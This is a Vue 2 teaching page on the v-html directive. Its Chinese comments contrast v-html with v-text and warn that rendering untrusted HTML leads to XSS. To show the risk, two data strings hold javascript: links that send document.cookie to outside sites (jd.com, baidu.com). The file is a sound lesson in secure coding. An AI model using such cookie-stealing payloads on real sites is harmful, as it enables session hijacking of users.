<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>v-html</title>
</head>
<script src="/js/vue.js"></script>

<body>
  <!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
  <div id="root">
    <div v-text="name">11111111111111</div>
    <div v-text="str">1232</div>
    <!--  v-test不支持结构的解析
      v-html支持结构的解析-->
    <div v-html="str">1232</div>
    <div v-html="str2">1232</div>
    <div v-html="str3">1232</div>

  </div>
  <script>
    Vue.config.productionTip = false;
    new Vue({
      el: "#root",  //https://www.baidu.com/
      data: {
        name: "xdd",
        str: "<h3>你好xdd<h3>",
        str2: '<a href=javascript:location.href="https://www.jd.com/?"+document.cookie>快1111111来</a>',
        str3: '<a href=javascript:location.href="https://www.baidu.com/?"+document.cookie>11111 </a>'
      }
    })


  </script>
</body>

</html>
